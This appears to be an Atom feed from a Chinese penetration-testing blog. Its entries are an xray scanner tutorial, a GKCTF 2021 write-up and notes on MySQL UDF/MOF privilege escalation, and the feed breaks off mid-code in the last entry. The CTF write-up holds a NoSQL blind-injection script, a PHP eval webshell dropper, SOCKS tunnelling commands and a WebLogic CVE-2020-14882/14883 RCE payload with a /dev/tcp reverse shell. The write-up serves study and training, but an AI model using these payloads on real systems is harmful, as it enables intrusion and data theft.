<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cr&#39;s Blog</title>
  
  
  <link href="https://coldrainh.github.io/atom.xml" rel="self"/>
  
  <link href="https://coldrainh.github.io/"/>
  <updated>2021-10-10T09:11:58.344Z</updated>
  <id>https://coldrainh.github.io/</id>
  
  <author>
    <name>雨雾</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Xray基础使用介绍</title>
    <link href="https://coldrainh.github.io/2021/10/10/Xray%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/"/>
    <id>https://coldrainh.github.io/2021/10/10/Xray%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/</id>
    <published>2021-10-10T09:04:25.000Z</published>
    <updated>2021-10-10T09:11:58.344Z</updated>
    
    <content type="html"><![CDATA[<p>官方使用文档：<br /><a href="https://docs.xray.cool/">https://docs.xray.cool/</a><br /><strong>#xray简介</strong><br />xray 是一款功能强大的安全评估工具，由多名经验丰富的一线安全从业者呕心打造而成，<span id="more"></span>主要特性有:</p><ul><li><strong>检测速度快</strong>。发包速度快; 漏洞检测算法高效。</li><li><strong>支持范围广</strong>。大至 OWASP Top 10 通用漏洞检测，小至各种 CMS 框架 POC，均可以支持。</li><li><strong>代码质量高</strong>。编写代码的人员素质高, 通过 Code Review、单元测试、集成测试等多层验证来提高代码可靠性。</li><li><strong>高级可定制</strong>。通过配置文件暴露了引擎的各种参数，通过修改配置文件可以极大的客制化功能。</li><li><strong>安全无威胁</strong>。xray 定位为一款安全辅助评估工具，而不是攻击工具，内置的所有 payload 和 poc 均为无害化检查。</li></ul><p>目前支持的漏洞检测类型包括:</p><ul><li>XSS漏洞检测 (key: xss)</li><li>SQL 注入检测 (key: sqldet)</li><li>命令/代码注入检测 (key: cmd-injection)</li><li>目录枚举 (key: dirscan)</li><li>路径穿越检测 (key: path-traversal)</li><li>XML 实体注入检测 (key: xxe)</li><li>文件上传检测 (key: upload)</li><li>弱口令检测 (key: brute-force)</li><li>jsonp 检测 (key: jsonp)</li><li>ssrf 检测 (key: ssrf)</li><li>基线检查 (key: baseline)</li><li>任意跳转检测 (key: redirect)</li><li>CRLF 注入 (key: crlf-injection)</li><li>Struts2 系列漏洞检测 (高级版，key: struts)</li><li>Thinkphp系列漏洞检测 (高级版，key: thinkphp)</li><li>POC 框架 (key: phantasm)</li></ul><p>其中 POC 框架默认内置 Github 上贡献的 poc，用户也可以根据需要自行构建 poc 并运行。<br />下载地址：<br />Github：<a href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a><br /><img src="https://img-blog.csdnimg.cn/img_convert/4fa0f9a64003e91a389cc6f091bb2077.png" alt="image.png"></p><ul><li><code>darwin_amd64</code> 苹果系统<br /></li><li><code>linux_386   </code> Linux x86<br /></li><li><code>linux_amd64 </code> Linux x64<br /></li><li><code>windows_386 </code> Windows x86<br /></li><li><code>windows_amd64</code> Windows x64<br /></li><li><code>sha256.txt   </code>校正文件，内含个版本的sha256的哈希值，请下载后自行校正以防被劫持投毒。<br /></li><li><code>Source Code  </code> 为Github自动打包的，无意义，请忽略。<br /></li></ul><p>运行：<br />下载对应系统的版本后，解压缩zip文件，Linux / Mac用户在终端（终端）运行，Windows用户请在Powershell或其他高级Shell中运行，在CMD中运行可能体验不佳。<br /><img src="https://img-blog.csdnimg.cn/img_convert/d7879e6dea3c5b8a7da11d7cf8510cf6.png" alt="image.png"></p><ul><li><p><code>mitm</code> 中 <code>restriction</code> 中 <code>hostname_allowed</code> 增加 <code>testphp.vulnweb.com</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mitm:</span><br><span class="line">  ...</span><br><span class="line">  restriction:                          </span><br><span class="line">    hostname_allowed:                   # 允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1/24、1.1-4.1.1-8</span><br><span class="line">    - testphp.vulnweb.com</span><br></pre></td></tr></table></figure><p>因为我们的测试目标站就是 <code>[http://testphp.vulnweb.com](http://testphp.vulnweb.com)</code>，增加这个过滤之后，xray 将只会扫描该站的流量，避免扫描到非授权目标站点。</p></li><li><p>设定漏洞扫描结果的输出，这里选择使用 html 文件输出，所以命令行后面要增加 <code>--html-output xray-testphp.html</code>。</p></li><li><p><strong>xray 配置文件中默认不允许扫描 gov 和 edu 等网站，如果想对这些网站进行授权测试，需要移除 <code>hostname_disallowed</code> 的相关配置才可以。严禁未授权的测试！否则后果自负。</strong></p></li></ul><p>开始扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output xray-testphp.html</span><br></pre></td></tr></table></figure><p><strong>开始扫描</strong><br />然后就可以看到 xray 界面开始输出漏洞信息，下面是几个快速链接，可以点击用于体验更多的漏洞类型的扫描<br /><img src="https://img-blog.csdnimg.cn/img_convert/fc183441887f1db8afd26e084e7e799d.png" alt="image.png"><br>更多的漏洞类型的扫描<br />[外链图片转存中…(img-uBuaiwX8-1633856890582)]</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;官方使用文档：&lt;br /&gt;&lt;a href=&quot;https://docs.xray.cool/&quot;&gt;https://docs.xray.cool/&lt;/a&gt;&lt;br /&gt;&lt;strong&gt;#xray简介&lt;/strong&gt;&lt;br /&gt;xray 是一款功能强大的安全评估工具，由多名经验丰富的一线安全从业者呕心打造而成，</summary>
    
    
    
    <category term="渗透测试工具﻿" scheme="https://coldrainh.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="xray" scheme="https://coldrainh.github.io/tags/xray/"/>
    
    <category term="渗透测试工具" scheme="https://coldrainh.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>gkctf2021hackme</title>
    <link href="https://coldrainh.github.io/2021/10/10/gkctf2021hackme/"/>
    <id>https://coldrainh.github.io/2021/10/10/gkctf2021hackme/</id>
    <published>2021-10-09T16:02:59.000Z</published>
    <updated>2021-10-10T08:47:18.197Z</updated>
    
    <content type="html"><![CDATA[<p>进入题目，出现的是一个登录框：<br /><img src="https://img-blog.csdnimg.cn/img_convert/30b5156edecfcf2b0ff84f6c4b80b580.png#align=left&display=inline&height=486&&originHeight=486&originWidth=676&size=113208&status=done&style=none&width=676" alt="image.png"><br /><span id="more"></span>查看源码后提</p><p>示：<!--doyounosql?--><br />怀疑是Nosql注入，尝试登录，查看数据包是json传输：<img src="https://img-blog.csdnimg.cn/img_convert/276648c0cae45e8fb08ebad107c0240c.png#align=left&display=inline&height=82&&originHeight=82&originWidth=326&size=2662&status=done&style=none&width=326" alt="image.png"><br />burp抓包，构造永真式登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现被检测了，<br /><img src="https://img-blog.csdnimg.cn/img_convert/01c93c7eaf1817598c624e8457d2ca41.png#align=left&display=inline&height=364&&originHeight=364&originWidth=1031&size=56917&status=done&style=none&width=1031" alt="image.png"><br />根据提示一：使用unicode编码绕过：<br /><img src="https://img-blog.csdnimg.cn/img_convert/122aa960385b6f2aedb5031f847afd2b.png#align=left&display=inline&height=375&&originHeight=375&originWidth=1155&size=57703&status=done&style=none&width=1155" alt="image.png"><br />猜测是用Nosql盲注获得admin密码，判定条件为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;msg&quot;:&quot;登录了，但没完全登录&quot;&#125;    // 真</span><br><span class="line">&#123;&quot;msg&quot;:&quot;登录失败&quot;&#125;    // 假</span><br></pre></td></tr></table></figure><p>编写盲注脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">password = &#x27;&#x27;</span><br><span class="line">url = &#x27;http://node4.buuoj.cn:29587/login.php&#x27;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    for c in string.printable:</span><br><span class="line">        if c not in [&#x27;*&#x27;, &#x27;+&#x27;, &#x27;.&#x27;, &#x27;?&#x27;, &#x27;|&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;$&#x27;]:</span><br><span class="line"></span><br><span class="line">            # When the method is GET</span><br><span class="line">            get_payload = &#x27;?username=admin&amp;password[$regex]=^%s&#x27; % (password + c)</span><br><span class="line">            # When the method is POST</span><br><span class="line">            post_payload = &#123;</span><br><span class="line">                &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">                &quot;password[$regex]&quot;: &#x27;^&#x27; + password + c</span><br><span class="line">            &#125;</span><br><span class="line">            # When the method is POST with JSON</span><br><span class="line">            json_payload = &quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&#123;&quot;\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot; % (password + c)</span><br><span class="line">            headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;</span><br><span class="line">            r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json</span><br><span class="line"></span><br><span class="line">            #r = requests.post(url=url, data=post_payload)</span><br><span class="line">            if &#x27;但没完全登录&#x27; in r.content.decode():</span><br><span class="line">                print(&quot;[+] %s&quot; % (password + c))</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure><p>得到密码后登录：<br /><img src="https://img-blog.csdnimg.cn/img_convert/67a6fed5612d3df484ac5f5098f5cbbe.png#align=left&display=inline&height=425&&originHeight=425&originWidth=1346&size=380198&status=done&style=none&width=1346" alt="image.png"><br />这里可以读取文件：<img src="https://img-blog.csdnimg.cn/img_convert/9cff577c099cd168568470b8f975550a.png#align=left&display=inline&height=173&&originHeight=173&originWidth=1903&size=290076&status=done&style=none&width=1903" alt="image.png"><br />尝试读取flag,提示flag在内网<br /><img src="https://img-blog.csdnimg.cn/img_convert/e3eed0179b1158f5d390573af28bb5c2.png#align=left&display=inline&height=50&&originHeight=50&originWidth=527&size=21648&status=done&style=none&width=527" alt="image.png"><br />再次根据提示：注意server和其配置文件！<br />server: nginx/1.17.6，直接读取Nginx配置文件：/usr/local/nginx/conf/nginx.conf，得到如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        error_page 404 404.php;</span><br><span class="line">        root /usr/local/nginx/html;</span><br><span class="line">        index index.htm index.html index.php;</span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">           root           /usr/local/nginx/html;</span><br><span class="line">           fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">           fastcgi_index  index.php;</span><br><span class="line">           fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">           include        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">resolver 127.0.0.11 valid=0s ipv6=off;</span><br><span class="line">resolver_timeout 10s;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # weblogic</span><br><span class="line">    server &#123;</span><br><span class="line">listen       80;</span><br><span class="line">server_name  weblogic;</span><br><span class="line">location / &#123;</span><br><span class="line">proxy_set_header Host $host;</span><br><span class="line">set $backend weblogic;</span><br><span class="line">proxy_pass http://$backend:7001;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现内网中确实还有一个应用，在内网 <code>weblogic</code> 主机的 7001 端口上运行着一个 weblogic 服务。下面我们就想办法攻击这个内网的 weblogic。<br />根据info.php发现目标环境开启了session.upload_progress.enabled.<br /><img src="https://img-blog.csdnimg.cn/img_convert/f3a0ac39c2af6fa8d178b4692a8940e4.png#align=left&display=inline&height=151&&originHeight=151&originWidth=997&size=14896&status=done&style=none&width=997" alt="image.png"><br />可以尝试使用PHP_SESSION_UPLOAD_PROGRESS Getshell.具体参考<a href="https://whoamianony.top/2021/05/14/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88%20SESSION_UPLOAD_PROGRESS%20%E7%9A%84%E5%88%A9%E7%94%A8/">https://whoamianony.top/2021/05/14/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88%20SESSION_UPLOAD_PROGRESS%20%E7%9A%84%E5%88%A9%E7%94%A8/</a><br />构造POC如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://node4.buuoj.cn:29587/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php phpinfo();fputs(fopen(&#x27;/usr/local/nginx/html/shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[whoami])?&gt;&#x27;);?&gt;&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在浏览器打开，使用burpsuite抓包，双开：<br /><img src="https://img-blog.csdnimg.cn/img_convert/7303009981cf894602d2c54569a3be09.png#align=left&display=inline&height=821&&originHeight=821&originWidth=1620&size=171506&status=done&style=none&width=1620" alt="image.png"><br />访问/shell.php，使用蚁剑连接：<br /><img src="https://img-blog.csdnimg.cn/img_convert/bdd49904063501b8986ffe0f14087f8c.png#align=left&display=inline&height=433&&originHeight=433&originWidth=1012&size=48858&status=done&style=none&width=1012" alt="image.png"><br />接下来就是内网渗透：<br />首先在VPS上上传ew，执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 1234</span><br></pre></td></tr></table></figure><p>该命令的意思是在vps上添加一个转接隧道，监听 1234，把本地 1234 端口收到的代理请求转交给1080端口，这里 1234 端口只是用于传输流量。<br /><img src="https://img-blog.csdnimg.cn/img_convert/5b54de0fc496d98770c481a7b0a2d640.png#align=left&display=inline&height=76&&originHeight=76&originWidth=597&size=6922&status=done&style=none&width=597" alt="image.png"><br />在上传ew到目标机：<br /><img src="https://img-blog.csdnimg.cn/img_convert/7ebdf6df78b04e2c98c76dbd94f9b6d1.png#align=left&display=inline&height=617&&originHeight=617&originWidth=1012&size=53072&status=done&style=none&width=1012" alt="image.png"><br />执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rssocks -d xx.xx.xx.xx -e 1234</span><br></pre></td></tr></table></figure><p>这句话的意思上将本机的1234端口转发到公网地址为xx.xx.xx.xx的机器上。<br />连接成功：<img src="https://img-blog.csdnimg.cn/img_convert/6b8e83f4a8559523599367e1b2d823ea.png#align=left&display=inline&height=84&&originHeight=84&originWidth=459&size=5039&status=done&style=none&width=459" alt="image.png"><br />然后使用 SwichyOmega 配置 socks5 代理服务：<br /><img src="https://img-blog.csdnimg.cn/img_convert/df6931bd4d1869f9c92a9fe0accf7298.png#align=left&display=inline&height=503&&originHeight=503&originWidth=1416&size=48139&status=done&style=none&width=1416" alt="image.png"><br />访问weblogic：<br /><img src="https://img-blog.csdnimg.cn/img_convert/1806da668ce2610c7fdd74467ee0632f.png#align=left&display=inline&height=737&&originHeight=737&originWidth=1370&size=66876&status=done&style=none&width=1370" alt="image.png"><br />可以看到weblogic的版本为12.2.1.4.0，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Weblogic 是 Oracle 公司推出的 J2EE 应用服务器。在 2020 年 10 月的更新中，Oracle 官方修复了两个长亭科技安全研究员 @voidfyoo 提交的安全漏洞，分别是 CVE-2020-14882 和 CVE-2020-14883。</span><br><span class="line">CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883 允许后台任意用户通过 HTTP 协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程 Weblogic 服务器上以未授权的任意用户身份执行命令。</span><br></pre></td></tr></table></figure><p>首先测试权限绕过漏洞（CVE-2020-14882），访问以下 URL，即可未授权访问到管理后台页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:/weblogic:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/cabfeceb826717006e63956becd83435.png#align=left&display=inline&height=734&&originHeight=734&originWidth=1277&size=85550&status=done&style=none&width=1277" alt="image.png"><br />绕过登录后，发送以下 POC 可远程执行命令，反弹shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">    http://weblogic:7001/console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22/c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22/bin/sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!=%20null%20)&#123;%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt();</span><br><span class="line"></span><br><span class="line">HTTP Headers: </span><br><span class="line">cmd: bash -i &gt;&amp; /dev/tcp/xx.xxx.xxx.xx/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/d0aae1cb3963605fc6f7ba1a92fcb352.png#align=left&display=inline&height=365&&originHeight=365&originWidth=1112&size=38416&status=done&style=none&width=1112" alt="image.png"><br />反弹成功：<br /><img src="https://img-blog.csdnimg.cn/img_convert/91173c4f71a0ed0b2c81b7eda7006880.png#align=left&display=inline&height=167&&originHeight=167&originWidth=738&size=13724&status=done&style=none&width=738" alt="image.png"><br />得到flag:<br /><img src="https://img-blog.csdnimg.cn/img_convert/da801437da8c6a867150525d46ebd139.png#align=left&display=inline&height=121&&originHeight=121&originWidth=470&size=8633&status=done&style=none&width=470" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;进入题目，出现的是一个登录框：&lt;br /&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/img_convert/30b5156edecfcf2b0ff84f6c4b80b580.png#align=left&amp;display=inline&amp;height=486&amp;&amp;originHeight=486&amp;originWidth=676&amp;size=113208&amp;status=done&amp;style=none&amp;width=676&quot; alt=&quot;image.png&quot;&gt;&lt;br /&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://coldrainh.github.io/categories/CTF/"/>
    
    
    <category term="渗透测试" scheme="https://coldrainh.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="ctf" scheme="https://coldrainh.github.io/tags/ctf/"/>
    
    <category term="weblogic" scheme="https://coldrainh.github.io/tags/weblogic/"/>
    
    <category term="内网穿透" scheme="https://coldrainh.github.io/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>关于自己</title>
    <link href="https://coldrainh.github.io/2021/10/09/my-first-blog/"/>
    <id>https://coldrainh.github.io/2021/10/09/my-first-blog/</id>
    <published>2021-10-09T07:31:08.000Z</published>
    <updated>2021-10-12T08:33:35.802Z</updated>
    
    <content type="html"><![CDATA[<p>欢迎来到我的博客，我会发布一下有关渗透的博文，请多交流！</p><span id="more"></span>]]></content>
    
    
    <summary type="html">&lt;p&gt;欢迎来到我的博客，我会发布一下有关渗透的博文，请多交流！&lt;/p&gt;</summary>
    
    
    
    <category term="个人介绍" scheme="https://coldrainh.github.io/categories/%E4%B8%AA%E4%BA%BA%E4%BB%8B%E7%BB%8D/"/>
    
    
    <category term="渗透测试" scheme="https://coldrainh.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="个人介绍" scheme="https://coldrainh.github.io/tags/%E4%B8%AA%E4%BA%BA%E4%BB%8B%E7%BB%8D/"/>
    
  </entry>
  
  <entry>
    <title>权限提升-MY&amp;MS&amp;ORA等SQL数据库提权</title>
    <link href="https://coldrainh.github.io/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&amp;MS&amp;ORA%E7%AD%89SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
    <id>https://coldrainh.github.io/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&amp;MS&amp;ORA%E7%AD%89SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</id>
    <published>2021-10-09T07:31:08.000Z</published>
    <updated>2021-10-12T08:33:03.186Z</updated>
    
    <content type="html"><![CDATA[<p>在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，但需要知道<strong>数据库提权</strong>的<strong>前提条件：</strong><br /><strong>服务器开启数据库服务及获取到最高权限用户密码</strong>。除Access数据库外，其他数据库基本都存在数据库提权的可能。</p><span id="more"></span><br />#数据库应用提权在权限提升中的意义 <br />#WEB 或本地环境如何探针数据库应用 <br />#数据库提权权限用户密码收集等方法<br />#目前数据库提权对应的技术及方法等<br /><p><br />Mysql的密码：<br />select * from mysql.user;<br /><strong><br /></strong>#案例1.MYSQL数据库提权演示-脚本&amp;MSF**<br /><strong>流程：服务探针-信息收集-提权利用-获取权限</strong><br /><strong>UDF提权原理：</strong><br />UDF（User-Defined-Function），即用户自定义函数，通过新添加函数对MySQL的功能进行扩充。根据MySQL用户自定义函数的功能，写入有执行系统命令的UDF，通过调用此UDF，达到提权的命令。<br />MySQL数据库提权需要满足以下几个条件：</p><ol><li>MySQL服务以管理员权限启动。</li><li>获取了MySQL”root“用户的密码</li><li>MySQL可以连接</li></ol><p><strong>MOF提权原理：</strong><br />托管对象格式（MOF）文件是创建和注册提供程序、事件类别和事件的简便方法。MOF文件每隔5秒就会监控进程的创建和死亡，或MySQL是以管理员身份启动，并且可以往MOF的文件路径”C:/windows/system32/wbem/mof” 中写入文件，便可以通过上传MOF进行提权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">1.UDF提权知识点：（基于MYSQL调用命令执行函数）</span><br><span class="line">读取网站数据配置文件（了解其命名规则及查找技巧）</span><br><span class="line">sql data inc config conn database common include等</span><br><span class="line"></span><br><span class="line">读取数据库存储或备份文件（了解其数据库存储格式及对应内容）</span><br><span class="line">MYSQL/data/mysql/user.MYD#账号密码</span><br><span class="line"></span><br><span class="line">@@basedir/data/数据库名/表名.myd</span><br><span class="line">（表名.myd存储的数据）</span><br><span class="line">利用脚本暴力破解（了解数据库是否支持外联及如何开启外联）</span><br><span class="line">远程本地暴力破解，服务器本地暴力破解</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用自定义函数导出dll文件进行命令执行</span><br><span class="line">select version() </span><br><span class="line">select @@basedir</span><br><span class="line">手工创建plugin目录或利用HTFS流创建</span><br><span class="line">select &#x27;x&#x27; into dumpfile &#x27;目录/lib/plugin::INDEX_ALLOCATION&#x27;;</span><br><span class="line">1.mysql&lt;5.1 导出目录：c:/windows或system32</span><br><span class="line">2.mysql =&gt;5.1 导出安装目录/lib/plugin</span><br><span class="line"></span><br><span class="line">2.MOF知识点：（基于MYSQL特性的安全问题）</span><br><span class="line">导出自定义mof文件到系统目录加载</span><br><span class="line">https://www.cnblogs.com/xishaonian/p/6384535.html</span><br><span class="line">select load_file(&#x27;C:/phpStudy/PHPTutorial/WWW/user_add.mof</span><br><span class="line">&#x27;) into 